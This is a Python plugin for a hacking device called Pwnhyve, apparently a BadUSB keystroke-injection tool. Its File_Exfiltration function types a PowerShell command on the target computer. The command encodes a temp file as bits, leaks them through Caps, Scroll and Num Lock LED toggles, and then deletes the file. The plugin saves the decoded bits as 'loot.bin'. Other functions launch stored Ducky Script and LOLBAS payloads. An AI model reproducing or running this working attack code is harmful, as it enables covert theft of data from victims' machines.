from PIL import ImageFont
from time import sleep
from core.badusb.badusb import BadUSB, DuckyScriptInterpreter
import os
from core.plugin import BasePwnhyvePlugin

class vars:

    payloadList = {}

    font = ImageFont.truetype('core/fonts/roboto.ttf', 11)

usb = BadUSB()

class Plugin(BasePwnhyvePlugin):
    def File_Exfiltration(tpil):
        global usb
        handler = tpil.gui.usbRunPercentage(tpil) # init handler

        handler.addText("hit any key to run payload\nexfiltrating: $env:tmp/z")

        tpil.waitForKey(debounce=True)

        usb.run("powershell")
        sleep(0.125)
        usb.write(';'.join([
            "foreach($b in $(cat $env:tmp\z -En by)){$bin = [System.Convert]::ToString($b, 2);if ($bin.Length -ne 8) {$bin = '0' * (8 - $bin.Length % 8) + $bin} foreach($v in $bin.toCharArray()) { if($v -eq '1'){$o+='%{CAPSLOCK}{SCROLLLOCK}%{CAPSLOCK}'}else{$o+='{SCROLLLOCK}'} }}",
            "Add-Type -A System.Windows.Forms",
            "[System.Windows.Forms.SendKeys]::SendWait('%{NUMLOCK}')",
            "[System.Windows.Forms.SendKeys]::SendWait($o)",
            "[System.Windows.Forms.SendKeys]::SendWait('%{NUMLOCK}')"
            "rm $env:tmp\z"
        ]))

        databinary = ""
        cl = 0

        while not usb.numLock:
            sleep(0.025)

        while True:
            if usb.scrollLock:

                cl = 0

                if usb.capsLock:
                    databinary += "1"
                else:
                    databinary += "0"

                while usb.scrollLock:
                    sleep(1/(2048*1.5)) # wait for clock to be over

    
            else:
                cl += 1

                if cl == 1500:
                    print("cl reached max")
                    break

                sleep(1/(2048*1.5))

        zb = []
        d = ""
        for x in databinary:
            d += x
            if len(d) == 8:
                zb.append(d)
                d = ""
            
        print(zb)

        with open("loot.bin", "wb") as f:
            byte_sequence = bytes([int(seq, 2) for seq in zb])

            f.write(byte_sequence)
            f.flush()

        handler.exit()

    def Ducky_Payloads(tpil):
        global usb
        # args: [draw, disp, image]

        print("abcd")

        payloads = os.listdir("./payloads/")

        vars.payloadList["back"] = '0'

        sleep(0.5)

        a = tpil.gui.menu(payloads)

        if a == "back":
            return

        if a == None:
            return

        draw,disp,image = tpil.__getDDI__()
        dsi = DuckyScriptInterpreter(usb, "./payloads/{}".format(a), tpil)

        dsi.parse()

        dsi.handler.addText("press any key..")
        dsi.handler.exit()

        tpil.waitForKey()

    def LOLBAS(tpil):

        basedir = "./core/LOLBAS/"
        directory = basedir

        while True:
            # theres definitely a better way of doin this
            ####

            folder = tpil.gui.menu([x if os.path.isdir(x) else "" for x in os.listdir("./core/LOLBAS")])

            if folder == None: return

            directory += folder

            ###

            script = tpil.menu([x.replace(".txt", "") for x in os.listdir(directory)])

            if script == None: directory = basedir; continue

            directory += script

            break

            ###

        dsi = DuckyScriptInterpreter(usb, directory,
                                      tpil)

        dsi.parse()

        dsi.handler.addText("press any key..")
        dsi.handler.exit()

        tpil.waitForKey()